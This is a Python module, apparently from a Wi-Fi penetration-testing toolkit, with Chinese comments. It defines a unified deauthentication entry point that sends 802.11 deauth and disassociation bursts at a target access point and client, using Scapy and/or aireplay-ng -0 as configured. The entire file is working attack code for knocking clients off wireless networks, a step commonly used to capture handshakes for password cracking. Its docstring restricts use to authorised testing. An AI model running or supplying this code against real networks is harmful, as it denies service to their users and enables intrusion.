#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""统一 deauth 入口：aireplay + Scapy 双通道。

默认策略 (deauth_engine=auto)：
  1) 有 scapy → 先 Scapy 高密度双向 deauth/disassoc 突发
  2) 再 aireplay-ng -0 补一发（兼容旧流程）
  3) 无 scapy → 仅 aireplay，且提高默认包数

仅限授权测试；MFP(802.11w) 目标无法靠 deauth 踢站。
"""

from __future__ import annotations

from typing import Optional

from ..config import Configuration
from .aireplay import Aireplay
from .scapy_deauth import ScapyDeauth


def engine() -> str:
    '''auto | both | scapy | aireplay'''
    raw = str(getattr(Configuration, 'deauth_engine', 'auto') or 'auto').strip().lower()
    if raw in ('both', 'scapy', 'aireplay', 'auto'):
        return raw
    return 'auto'


def send_deauth(
    target_bssid: str,
    client_mac: Optional[str] = None,
    essid: Optional[str] = None,
    timeout: float = 2.0,
) -> dict:
    """对目标发 deauth。返回 {scapy: n, aireplay: bool}。"""
    if getattr(Configuration, 'no_deauth', False):
        return {'scapy': 0, 'aireplay': False, 'skipped': True}

    mode = engine()
    use_scapy = mode in ('auto', 'both', 'scapy')
    use_aireplay = mode in ('auto', 'both', 'aireplay')

    scapy_ok = ScapyDeauth.available()
    if mode == 'auto':
        # auto：有 scapy 则双通道，否则仅 aireplay
        use_scapy = scapy_ok
        use_aireplay = True
    elif mode == 'scapy' and not scapy_ok:
        use_scapy = False
        use_aireplay = True  # 降级

    result = {'scapy': 0, 'aireplay': False, 'skipped': False}

    if use_scapy and scapy_ok:
        result['scapy'] = ScapyDeauth.deauth(
            target_bssid,
            client_mac=client_mac,
        )

    if use_aireplay:
        # Scapy 已打过时 aireplay 少发几包即可；仅 aireplay 时用配置的 num_deauths
        n = getattr(Configuration, 'num_deauths', 8) or 8
        if result['scapy'] > 0:
            n = max(2, min(n, 4))
        try:
            Aireplay.deauth(
                target_bssid,
                essid=essid,
                client_mac=client_mac,
                num_deauths=n,
                timeout=timeout,
            )
            result['aireplay'] = True
        except Exception:
            result['aireplay'] = False

    return result
